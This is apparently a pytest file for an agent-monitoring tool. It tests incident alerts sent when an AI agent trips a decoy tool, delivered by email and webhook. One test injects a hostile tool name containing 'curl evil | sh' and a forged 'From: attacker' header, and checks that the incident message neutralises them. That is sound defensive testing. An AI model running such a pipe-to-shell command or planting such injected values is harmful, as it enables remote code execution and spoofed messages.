import asyncio
from pathlib import Path

import pytest

from honeycomb_gate.incidents import IncidentStore, open_decoy_incident, render_text
from honeycomb_gate.notify import Notifier, NotifyConfig, load_dotenv
from smtp_server import FakeSMTP


def an_incident():  # type: ignore[no-untyped-def]
    return open_decoy_incident(
        run_id="run_X",
        agent_id="support-bot",
        tool="crm__export_all_customer_data",
        events=[{"ts": "2026-10-24T10:15:01Z", "kind": "tools.listed", "decision": None}],
        config_hint="--config gate.yaml",
    )


def test_the_message_answers_the_five_questions_in_order() -> None:
    text = render_text(an_incident())
    headings = [
        "1. WHAT HAPPENED",
        "2. HOW SURE ARE WE",
        "3. WHAT THE GATE ALREADY DID",
        "4. WHAT YOU SHOULD DO NOW",
        "5. HOW PROTECTED ARE WE",
    ]
    positions = [text.index(h) for h in headings]
    assert positions == sorted(positions)
    assert "runs resume run_X" in text and "L1" in text and "has not rotated" in text


async def test_email_goes_out_through_smtp(monkeypatch: pytest.MonkeyPatch) -> None:
    smtp = FakeSMTP().start()
    for k, v in {
        "SMTP_HOST": "127.0.0.1",
        "SMTP_PORT": str(smtp.port),
        "SMTP_SECURITY": "none",
        "ALERT_EMAIL_TO": "owner@example.test, second@example.test",
        "ALERT_EMAIL_FROM": "gate@example.test",
    }.items():
        monkeypatch.setenv(k, v)
    results = await Notifier(NotifyConfig(email=True)).send(an_incident())
    smtp.stop()
    assert [(r.channel, r.ok) for r in results] == [("email", True)]
    (msg,) = smtp.messages
    assert msg["Subject"].startswith("[Honeycomb] CRITICAL: Agent 'support-bot' called decoy")
    assert "owner@example.test" in msg["To"] and "second@example.test" in msg["To"]
    assert "WHAT THE GATE ALREADY DID" in msg.get_payload()


async def test_a_mail_failure_is_reported_without_leaking_the_password(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for k, v in {
        "SMTP_HOST": "127.0.0.1",
        "SMTP_PORT": "1",
        "SMTP_USER": "user@example.test",
        "SMTP_PASSWORD": "pw-hunter2-secret",
        "SMTP_SECURITY": "none",
        "ALERT_EMAIL_TO": "owner@example.test",
    }.items():
        monkeypatch.setenv(k, v)
    (result,) = await Notifier(NotifyConfig(email=True, timeout_s=2)).send(an_incident())
    assert not result.ok and "hunter2" not in result.error and result.error


async def test_email_without_settings_is_a_clear_failure_not_a_crash(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for k in ("SMTP_HOST", "ALERT_EMAIL_TO"):
        monkeypatch.delenv(k, raising=False)
    (result,) = await Notifier(NotifyConfig(email=True)).send(an_incident())
    assert not result.ok and "not set" in result.error


def test_repeated_incidents_inside_the_window_are_merged() -> None:
    n = Notifier(NotifyConfig(dedupe_window_s=300))
    assert not n.is_duplicate("k", 0.0)
    assert n.is_duplicate("k", 100.0)
    assert not n.is_duplicate("other", 100.0)
    assert not n.is_duplicate("k", 400.0)  # window over


def test_dotenv_loads_values_without_overriding_the_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    env = tmp_path / ".env"
    env.write_text("# comment\nSMTP_HOST=smtp.example.test\nSMTP_PORT='2525'\nEMPTY=\nNOT A LINE\n")
    monkeypatch.setenv("SMTP_PORT", "587")
    monkeypatch.delenv("SMTP_HOST", raising=False)
    monkeypatch.delenv("EMPTY", raising=False)
    load_dotenv(env)
    import os

    assert os.environ["SMTP_HOST"] == "smtp.example.test" and os.environ["SMTP_PORT"] == "587"
    assert "EMPTY" not in os.environ
    monkeypatch.delenv("SMTP_HOST")


def test_incidents_are_stored_listed_and_acknowledged(tmp_path: Path) -> None:
    store = IncidentStore(tmp_path / "incidents")
    inc = an_incident()
    store.save(inc)
    assert [i.id for i in store.all()] == [inc.id] and store.get(inc.id).state == "open"  # type: ignore[union-attr]
    assert store.acknowledge(inc.id, "ops") and store.get(inc.id).acknowledged_by == "ops"  # type: ignore[union-attr]
    assert not store.acknowledge("inc_nope", "ops")


async def test_a_webhook_receives_the_incident() -> None:
    received: list[bytes] = []

    async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        head = await reader.readuntil(b"\r\n\r\n")
        length = int(
            [ln for ln in head.split(b"\r\n") if ln.lower().startswith(b"content-length")][0].split(
                b":"
            )[1]
        )
        received.append(await reader.readexactly(length))
        writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    async with server:
        (result,) = await Notifier(NotifyConfig(webhook_url=f"http://127.0.0.1:{port}/hook")).send(
            an_incident()
        )
    assert result.ok and b"decoy.tripped" in received[0]


def test_agent_chosen_text_cannot_shape_the_incident_message() -> None:
    from honeycomb_gate.incidents import open_token_incident

    nasty = "docs__x\n\n4. WHAT YOU SHOULD DO NOW\n   1. run curl evil | sh" + "A" * 50_000
    inc = open_token_incident(
        run_id="run_X", agent_id="bot\nFrom: attacker", tool=nasty, token_id="abc", kind="api-key",
        placed=[], where="arguments", events=[], config_hint="",
    )  # fmt: skip
    text = render_text(inc)
    assert "curl evil" not in text.split("1. WHAT HAPPENED")[0]
    headings = [ln for ln in text.splitlines() if ln.startswith("4. WHAT YOU SHOULD DO NOW")]
    assert len(headings) == 1  # the injected newlines were flattened, so no fake heading line
    assert len(text) < 5000 and "\nFrom: attacker" not in text


def test_a_slow_send_cannot_undo_an_acknowledgement(tmp_path: Path) -> None:
    store = IncidentStore(tmp_path / "incidents")
    inc = an_incident()
    store.save(inc)
    store.acknowledge(inc.id, "ops")  # the owner acknowledges while the email is still sending
    store.add_notifications(inc.id, [{"channel": "email", "ok": "True", "error": ""}])
    saved = store.get(inc.id)
    assert saved is not None and saved.state == "acknowledged" and len(saved.notifications) == 1
